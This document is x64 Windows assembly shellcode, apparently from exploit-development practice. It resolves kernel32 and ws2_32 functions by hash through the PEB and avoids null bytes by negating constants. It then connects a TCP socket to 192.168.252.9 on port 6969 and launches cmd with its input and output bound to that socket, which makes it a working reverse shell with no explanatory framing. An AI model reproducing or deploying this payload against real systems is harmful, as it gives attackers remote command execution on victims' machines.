start:
    mov rbp, rsp
    add rsp, 0xfffffffffffff9c0         ; Negated 0x640

resolve_kernel32:
    mov dl, 0x4b                        ; dl = 'K'
    mov rcx, 0xffffffffffffffa0
    neg rcx
    ;mov rcx, 0x60                       ;
    mov r8, gs:[rcx]                    ; R8 = address of PEB
    mov rdi, [r8 + 0x18]                ; RDI = address of _PEB_LDR_DATA
    mov rdi, [rdi + 0x30]               ; RDI = address of InInitializationOrderModuleList (first _LIST_ENTRY)

search:
    xor rcx, rcx
    mov rbx, [rdi + 0x10]               ; RBX = DllBase
    mov rsi, [rdi + 0x40]               ; RSI = address of UNICODE string BaseDllName.Buffer
    mov rdi, [rdi]                      ; RDI = address of the next _LIST_ENTRY
    cmp [rsi + 0x18], cx                ; Compare the 24-th UNICODE char with NULL
    jne search                          ; If length of BaseDllName is not 12 UNICODE chars, continue searching
    cmp [rsi], dl                       ; Compare the first UNICODE char with 'K'
    jne search                          ; If the first UNICODE char is not 'K', continue searching

find_function_jmp:
    jmp callback                        ; Jump to callback to make a negative (null byte free) call to get_find_function_addr

get_find_function_addr:                         
    pop rsi                             ; The address of find_function is popped in RSI
    mov [rbp + 0x8], rsi                ; The address of find_function is stored at (RBP + 8)
    ;jmp resolve_k32_sym                 ; Once the address of find_function has been stored, proceed with the resolution of kernel32 symbols
    jmp resolve_k32_sym_1               ; Dummy jump point to shorten distance, preventing NULL's

callback:
    call get_find_function_addr         ; When this call is done, the address of the 1st instruction find_function (add rsp, 8) is pushed to the stack
                                        ; This is the address of find_function, and it will be popped in ESI (see get_find_function_addr).
find_function:         
; Current Stack Layout:
;---------------------------------------------------------------------------
; QWORD: Return Address (addr of instruction after "call find_function", see below)
; QWORD: Number of hash bytes + 8           <- RSP
; QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
; QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
; ...
; QWORD: 0x0000000000000000
;---------------------------------------------------------------------------
    add rsp, 8                          ; Point RSP to (Number of hash bytes + 8)
    pop rax                             ; RAX = Number of hash bytes + 8
    push -1                             ; Write -1 on the stack instead of (Number of hash bytes + 8)
    add rsp, rax                        ; Add (Number of hash bytes + 8) to RSP: it now points to 0x0000000000000000
; Current Stack Layout:
;---------------------------------------------------------------------------
; QWORD: Return Address
; QWORD: 0xffffffffffffffff
; QWORD: <0x00000000> <Hash of CreateProcessA (4 bytes)>
; QWORD: <0x00000000> <Hash of LoadLibraryA (4 bytes)>
; ...
; QWORD: 0x0000000000000000                <- RSP
;---------------------------------------------------------------------------

find_function_loop2:
    xor rax, rax
    xor rdi, rdi
    mov eax, [rbx + 0x3c]               ; EAX = offset to the PE Header of the module = e_lfanew
    mov rcx, 0xffffffffffffff78
    neg rcx
    add rcx, rbx
    add rcx, rax
    mov edi, [rcx]
    ;mov edi, [rbx + rax + 0x88]         ; EDI = RVA of the Export Directory Table of the module (1st field: VirtualAddress)
    add rdi, rbx                        ; RDI = VMA of the Export Directory Table of the module
    mov ecx, [rdi + 24]                 ; ECX = NumberOfNames (field of the Export Directory Table of the module)
    mov eax, [rdi + 32]                 ; EAX = RVA of AddressOfNames (array of Name Addresses, field of the Export Directory Table)
    add rax, rbx                        ; EAX = VMA of AddressOfNames
    mov [rbp - 8], rax                  ; Save the VMA of AddressOfNames at (EBP - 8): this location is never touched for anything else

find_function_loop:
    dec ecx                             ; Initially, ECX = NumberOfNames: decrement to get the index of the last name
    mov rax, [rbp - 8]                  ; EAX = VMA of AddressOfNames
    mov esi, [rax + rcx * 4]            ; ESI = RVA of the current Symbol Name
    add rsi, rbx                        ; RSI = VMA of the current Symbol Name

compute_hash:
    xor rax, rax                        ; EAX = 0
    cdq                                 ; If the MSB of EAX = 1: EDX = 0x11111111
                                        ; If the MSB of EAX = 0: EDX = 0x00000000 -> fills EDX with the sign of EAX
                                        ; In this case, EDX = 0x00000000 because EAX = 0x00000000
    jmp compute_hash_repeat

resolve_k32_sym_1:
    ; Dummy jump point to shorten distance, preventing NULL's
    jmp resolve_k32_sym_2

compute_hash_repeat:
    ror edx, 0xd                        ; Right-shift EDX of 13 bits
    add edx, eax                        ; EDX += current EAX value
    lodsb                               ; Load the byte pointed by ESI into AL
    test al, al                         ; Test if the NULL terminator of the Symbol Name has been reached
    jnz compute_hash_repeat             ; If the NULL terminator has been reached (ZF = 1), proceed to hash comparison
                                        ; Else, perform the next iteration of the hash-computation algorithm
                                        ; At this point, EDX contains the computed hash of the current symbol

find_function_compare:                          
    cmp edx, [rsp - 8]                  ; Compare the computed hash with the hash of the wanted symbol
    jnz find_function_loop              ; If ZF = 0, the hash is different: proceed with the next name from AddressOfNames
                                        ; If ZF = 1, the hash is equal: symbol found: continue hereby
    mov edx, [rdi + 36]                 ; EDX = RVA of the AddressOfNameOrdinals array
    add rdx, rbx                        ; RDX = VMA of the AddressOfNameOrdinals array
    mov cx, [rdx + 2 * rcx]             ; CX = Symbol's Ordinal (lower 16 bits of ECX)
    mov edx, [rdi + 28]                 ; EDX = RVA of the AddressOfFunctions array
    add rdx, rbx                        ; RDX = VMA of the AddressOfFunctions array
    mov eax, [rdx + 4 * rcx]            ; EAX = AddressOfFunctions[ordinal] = RVA of the wanted symbol
    add rax, rbx                        ; EAX = VMA of the wanted symbol
    push rax                            ; Push the wanted symbol's VMA onto the stack:
                                        ; ATTENTION: The symbol's VMA overwrites its Hash on the stack!
    mov rax, [rsp - 8]
    cmp rax, -1                         ; If *(RSP - 8) is -1: ZF = 1: all wanted symbols have been resolved
    jnz find_function_loop2             ; Until all wanted symbols have been resolved, continue looping

find_function_finish:                   ; When we get here, all wanted symbols have been resolved: their VMAs are on the stack
    sub rsp, 16                         ; Point RSP to the Return Address of find_function
    ret                                 ; Return

resolve_k32_sym_2:
    mov rax, 0xffffffff13F1B172
    neg rax
    ;mov rax, 0x00000000ec0e4e8e         ; Hash of LoadLibraryA
    push rax
    mov rax, 0xffffffffE94C018E
    neg rax
    ;mov rax, 0x0000000016b3fe72         ; Hash of CreateProcessA
    push rax
    mov rax, 0xffffffff874A467D
    neg rax
    ;mov rax, 0x0000000078b5b983         ; Hash of TerminateProcess
    push rax
    ;mov rax, 32                         ; Push 32 onto the stack
    xor rax, rax
    mov al, 32
    push rax
    call [rbp + 8]                      ; Call to find_function (see find_function above)

load_ws2_32:
    ; mov rax, 0x0000000000006C6C         ; 'll x00 x00 x00 x00 x00 x00' (reversed)
    mov rax, 0xffffffffffff9394
    neg rax
    push rax
    ;mov rax, 0x642E32335F327377         ; 'ws2_32.d' (reversed)
    mov rax, 0x9bd1cdcca0cd8c89
    neg rax
    push rax
    mov rcx, rsp                        ; Paramter 1 = address of "ws2_32.dll"
    sub rsp, 40                         ; Create 40 bytes of room on the stack
    call [rsp + 80]                     ; Call LoadLibraryA    
    nop

resolve_ws2_sym:
    mov rbx, rax                        ; RBX = Base Address of ws2_32.dll
    ;mov rax, 0x0000000060aaf9ec         ; Hash of connect
    mov rax, 0xffffffff9f550614
    neg rax
    push rax
    ;mov rax, 0x00000000adf509d9         ; Hash of WSASocketA
    mov rax, 0xffffffff520af627
    neg rax
    push rax
    ;mov rax, 0x000000003bfcedcb         ; Hash of WSAStartup
    mov rax, 0xffffffffc4031235
    neg rax
    push rax
    xor rax, rax
    mov al, 32
    push rax                            ; Push 32 (Number of Hashes pushed + 8)
    call [rbp + 8]                      ; Call find_function
    ;sub rsp, 512
    xor eax, eax
    mov ax, 0x201
    dec al
    sub rsp, rax

call_WSAStartup:
    ;mov rcx, 0x202                      ; RCX = WinSock Version 2.2
    xor rcx,rcx
    mov cx, 0x202
    ;lea rdx, [rsp + 800]                ; RDX = Address of output WSAData structure
    xor rdx, rdx
    mov dx, 0x320
    lea rdx, [rsp+rdx]
    ;call [rsp + 520]                    ; Call WSAStartup
    mov rax, 0xfffffffffffffdf8
    neg rax
    call [rsp+rax]

call_WSASocketA:
    ;mov rcx, 2                          ; Parameter af = 2 (AF_INET)
    xor rcx, rcx
    xor rdx, rdx
    xor r8, r8
    mov cl, 0x2
    ;mov rdx, 1                          ; Parameter type = 1
    inc rdx
    ;mov r8, 6                           ; Parameter protocol = 6 (TCP)
    add r8, 0x6
    xor r9, r9                          ; Parameter lpProtocolInfo = 0
    mov [rsp + 32], r9                  ; Parameter dwFlags = 0
    mov [rsp + 40], r9                  ; Parameter g = 0
    ;call [rsp + 528]                    ; Call WSASocketA
    mov rax, 0xfffffffffffffdf0
    neg rax
    call [rsp+rax]

call_connect:
    mov rsi, rax                        ; Save socket fd in RSI
    mov rcx, rax                        ; RCX = Parameter s = socket fd created with WSSocketA
    ;mov r8, 16                          ; R8 = Parameter namelen = 16
    xor r8,r8
    add r8, 16
    ; Preparation of the sockaddr_in structure on the stack:
    ; struct sockaddr_in {
    ;   QWORD: [sin_addr (4 bytes) | sin_port (2 bytes) | sin_family (2 bytes)]
    ;   QWORD: sin_zero = [00000000 00000000]
    ; }
    ;mov r9, 0x09FCA8C0391b0002          ; R9 = [IP = 192.168.252.9 | port = 0x391b = 6969 | AF_INET = 2]
    mov r9, 0xf603573fc6e4fffe
    neg r9
    ;lea rdx, [rsp + 800]                ; RDX = Parameter name = Address of struct sockaddr_in
    mov rax, 0xfffffffffffffce0
    neg rax
    lea rdx, [rsp+rax]
    mov [rdx], r9                       ; Write fields: sin_addr, sin_port, sin_family
    xor r9, r9
    mov [rdx + 8], r9                   ; Write field sin_zero
    ;call [rsp + 536]                    ; Call connect
    mov rax, 0xfffffffffffffde8
    neg rax
    call [rsp+rax]

create_STARTUPINFOA:
    ;lea rdi, [rsp + 800]
    mov rax, 0xfffffffffffffce0
    neg rax
    lea rdi, [rsp+rax]
    ;add rdi, 0x300
    sub rdi, 0xfffffffffffffd01
    inc rdi
    mov rbx, rdi
    xor eax, eax
    ;mov ecx, 0x20
    xor ecx, ecx
    add cl, 0x20
    rep stosd                           ; Zero-out 0x80 bytes
    ;mov eax, 0x68                       ; EAX = sizeof(_STARTUPINFO) = 0x68
    mov al, 0x68
    mov [rbx], eax                      ; Field lpStartInfo.cb = sizeof(_STARTUPINFO)
    ; mov eax, 0x100                      ; EAX = STARTF_USESTDHANDLES
    xor eax, eax
    add al, 0xff
    inc eax
    mov [rbx + 0x3c], eax               ; Field lpStartupInfo.dwFlags = STARTF_USESTDHANDLES
    mov [rbx + 0x50], rsi               ; Field lpStartupInfo.hStdInput = socket fd
    mov [rbx + 0x58], rsi               ; Field lpStartupInfo.hStdOutput = socket fd
    mov [rbx + 0x60], rsi               ; Field lpStartupInfo.hStdError = socket fd    

call_CreateProccessA:
    ;xor rax, rax
    xor rcx, rcx                        ; Parameter lpApplicationName = 0
    ;lea rdx, [rsp + 800]                ; Parameter lpCommandLine
    mov rax, 0xfffffffffffffce0
    neg rax
    lea rdx, [rsp+rax]
    ;xor rax, rax
    ;add rdx, 0x180
    mov rax, 0xfffffffffffffe80
    neg rax
    add rdx, rax
    xor rax, rax
    ;mov eax, 0x646d63                   ; EAX = "cmd"
    mov rax, 0xffffffffff9b929d
    neg rax
    mov [rdx], rax                      ; Write "cmd" in the lpCommandLine parameter
    xor r8, r8                          ; Parameter lpProcessAttributes = 0
    xor r9, r9                          ; Parameter lpThreadAttributes = 0
    xor rax, rax
    inc eax
    mov [rsp + 0x20], rax               ; Parameter bInheritHandles = 1
    dec eax
    mov [rsp + 0x28], rax               ; Parameter dwCreationFlags = 0
    mov [rsp + 0x30], rax               ; Parameter lpEnvironment = 0
    mov [rsp + 0x38], rax               ; Parameter lpCurrentDirectory = 0
    mov [rsp + 0x40], rbx               ; Parameter lpStartupInfo = address of _STARTUPINFO
    add rbx, 0x68
    mov [rsp + 0x48], rbx               ; Parameter lpProcessInformation = output address, right after _STARTUPINFO
    ;call [rsp + 616]
    mov rax, 0xfffffffffffffd98
    neg rax
    call [rsp+rax]

call_TerminateProcess:
    xor rcx, rcx
    dec rcx                             ; Parameter hProcess = -1 = this process
    xor rdx, rdx                        ; Parameter uExitCode = 0 (graceful termination)
    ;call [rsp + 608]                    ; Call TerminateProcess
    mov rax, 0xfffffffffffffda0
    neg rax
    call [rsp+rax]

